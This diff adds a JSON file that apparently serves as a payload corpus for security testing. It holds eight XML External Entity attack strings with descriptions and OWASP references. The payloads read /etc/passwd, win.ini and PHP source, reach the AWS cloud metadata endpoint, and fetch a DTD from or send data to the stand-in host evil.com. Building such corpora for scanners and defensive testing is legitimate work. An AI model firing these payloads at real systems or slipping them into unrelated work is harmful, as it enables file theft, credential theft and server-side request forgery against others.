@@ -1,0 +1,82 @@
+[
+  {
+    "id": "xxe-001",
+    "family": "xxe",
+    "subtype": "basic",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "context": "xml",
+    "description": "Basic XXE to read /etc/passwd via external entity",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xxe-002",
+    "family": "xxe",
+    "subtype": "basic",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+    "context": "xml",
+    "description": "Basic XXE to read Windows system file",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
+    "platform_specific": {"windows": true}
+  },
+  {
+    "id": "xxe-003",
+    "family": "xxe",
+    "subtype": "blind",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/xxe?data=SECRET\">]><foo>&xxe;</foo>",
+    "context": "xml",
+    "description": "Blind XXE for out-of-band data exfiltration",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xxe-004",
+    "family": "xxe",
+    "subtype": "ssrf",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+    "context": "xml",
+    "description": "XXE via SSRF to access cloud metadata endpoint",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
+    "platform_specific": {"aws": true}
+  },
+  {
+    "id": "xxe-005",
+    "family": "xxe",
+    "subtype": "file_read",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
+    "context": "xml",
+    "description": "XXE via PHP filter wrapper for source code read",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
+    "platform_specific": {"php": true}
+  },
+  {
+    "id": "xxe-006",
+    "family": "xxe",
+    "subtype": "basic",
+    "payload_string": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "context": "xml",
+    "description": "XXE without XML declaration",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xxe-007",
+    "family": "xxe",
+    "subtype": "basic",
+    "payload_string": "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "context": "xml",
+    "description": "XXE with ELEMENT declaration",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xxe-008",
+    "family": "xxe",
+    "subtype": "parameter_entity",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">%xxe;]><foo>test</foo>",
+    "context": "xml",
+    "description": "XXE using parameter entities for DTD injection",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
+    "platform_specific": {}
+  }
+]
